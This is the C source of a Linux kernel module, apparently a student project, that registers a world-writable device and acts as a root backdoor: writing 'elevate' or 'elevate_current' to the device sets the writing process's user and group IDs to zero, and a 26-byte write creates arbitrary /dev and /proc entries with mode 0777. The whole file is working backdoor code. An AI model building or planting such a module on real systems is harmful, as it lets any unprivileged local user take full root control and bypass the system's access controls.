#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/miscdevice.h>

#include <asm/page.h>
#include <asm/current.h>
#include <asm/uaccess.h>

MODULE_AUTHOR("Hunter Durnford.5");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Project 2");

#define DEVICE_NAME "kernel_device_9001"
#define CLASS_NAME  "ttyR"

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define value(x) x.val
#else
#define value(x) x
#endif

static int device_open(struct inode*, struct file*);
static int device_close(struct inode*, struct file*);
static ssize_t device_read(struct file*, char*, size_t, loff_t*);
static ssize_t device_write(struct file*, const char*, size_t, loff_t*);
static int my_dev_uevent(struct device *device, struct kobj_uevent_env *environment);
static char *tty_devnode(struct device *dev, umode_t *mode);

/* Global Structures */
static struct class* hostClass;
static struct device* hostDevice;
struct proc_dir_entry *procEntry;
static struct file_operations fileops = {
        .owner = THIS_MODULE,
        .open = device_open,
        .read = device_read,
        .write = device_write,
        .release = device_close,
};


/* Global Data Types */
static int major;

static int __init kernel_init(void)
{
    // register device
    major = register_chrdev(0, DEVICE_NAME, &fileops);
    if (major < 0) {
        printk(KERN_INFO "Kernel module failed to load.\n");
        return major;
    }
    hostClass = class_create(THIS_MODULE, CLASS_NAME);
    hostClass->dev_uevent = my_dev_uevent;
    hostDevice = device_create(hostClass, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    printk(KERN_INFO "Kernel module loaded.\n");
    return 0;
}

static void __exit kernel_exit(void)
{
    // unregister device
    device_destroy(hostClass, MKDEV(major, 0));
    class_unregister(hostClass);
    class_destroy(hostClass);
    unregister_chrdev(major, DEVICE_NAME);
    printk(KERN_INFO "Kernel module unloaded.\n");
}

// REDECLARE THE tty_devnode so mode is rwx on creation
static char *tty_devnode(struct device *dev, umode_t *mode) {
    if (!mode)
        return NULL;
    if (dev->devt == MKDEV(TTYAUX_MAJOR, 0) ||
        dev->devt == MKDEV(TTYAUX_MAJOR, 2))
        *mode = 0777;
    return NULL;
}

static int my_dev_uevent(struct device *device, struct kobj_uevent_env *environment) {
    add_uevent_var(environment, "DEVMODE=%#o", 0777);
    return 0;
}

static int device_open(struct inode *inodep, struct file *filep) {
    printk(KERN_INFO "Kernel device opened.\n");
    return 0;
}

static int device_close(struct inode *inodep, struct file *filep) {
    printk(KERN_INFO "Kernel device closed.\n");
    return 0;
}

static ssize_t device_read(struct file *filep, char *buff, size_t len, loff_t *offset) {
    int err = 0;
    char *message = "";
    int m_len = strlen(message);
    err = copy_to_user(buff, message, m_len);
    return err == 0 ? m_len : -EFAULT;
}

// Talk to the file
static ssize_t device_write(struct file *filep, const char *buff, size_t len, loff_t *offset) {
    // return to user
    char *message;
    char code[] = "let me in";
    char code2[] = "elevate_current";
    char code3[] = "elevate";

    /* UID GID Management */
    struct cred *credentials;
    struct task_struct *task;
    message = (char*)kmalloc(len+1, GFP_KERNEL);

    if(message != NULL) {
        copy_from_user(message, buff, len);
        task = get_current();
        // If the message is the pid that we want to give root access to
        if(memcmp(message, code, 9) == 0) {
            printk("You can talk to this device in /dev without root privileges.\n");
        } else if(len == 26) {
            /* this is for random file creation with the call_sys.c progran */
            // adds a ton of random files to the /dev folder
            printk(KERN_INFO "message len: %ld", len);
            static int major2 = 0;
            major2 = register_chrdev(0, message, &fileops);
            if (major2 < 0) {
                printk(KERN_INFO "Kernel module failed to load.\n");
                return major2;
            }
//          hostClass = class_create(THIS_MODULE, CLASS_NAME);
//          hostClass->dev_uevent = my_dev_uevent;
            printk(KERN_INFO "%s added to /dev/\n", message);
            hostDevice = device_create(hostClass, NULL, MKDEV(major2, 0), NULL, message);

            //process creation
            procEntry = proc_create(message, 0777, NULL, &fileops);
        } else if(memcmp(message, code2, 15) == 0) {
            // elevate privileges of the calling process (elevate_current)
            task = task->parent;
            credentials = prepare_creds();

            if(task == NULL) {
                printk("Task failure.\n");
                return 0;
            } else {
                // set to root
                value(credentials->suid) = value(credentials->sgid) = 0;
                value(credentials->fsuid) = value(credentials->fsgid) = 0;
                value(credentials->uid) = value(credentials->gid) = 0;
                value(credentials->euid) = value(credentials->egid) = 0;
                commit_creds(credentials);
                printk(KERN_INFO "Process %d elevated to root for task %s.\n", task->pid, task->parent->comm);
                printk(KERN_INFO "YOUR C PROGRAM NOW HAS ROOT PRIVILEGES.\n");
            }
        } else if(memcmp(message, code3, 7) == 0) {
            // elevate privileges of child of the calling process (elevate)
            credentials = prepare_creds();

            if(task == NULL) {
                printk("Task failure.\n");
                return 0;
            } else {
                // set to root
                value(credentials->suid) = value(credentials->sgid) = 0;
                value(credentials->fsuid) = value(credentials->fsgid) = 0;
                value(credentials->uid) = value(credentials->gid) = 0;
                value(credentials->euid) = value(credentials->egid) = 0;
                commit_creds(credentials);
                printk(KERN_INFO "Process %d elevated to root for task %s.\n", task->pid, task->comm);
                printk(KERN_INFO "YOUR C PROGRAM NOW HAS ROOT PRIVILEGES.\n");
            }
        }
        kfree(message);
    } else {
        printk(KERN_INFO "MEMORY ALLOCATION FAILED.\n");
    }
    return len;
}

module_init(kernel_init);
module_exit(kernel_exit);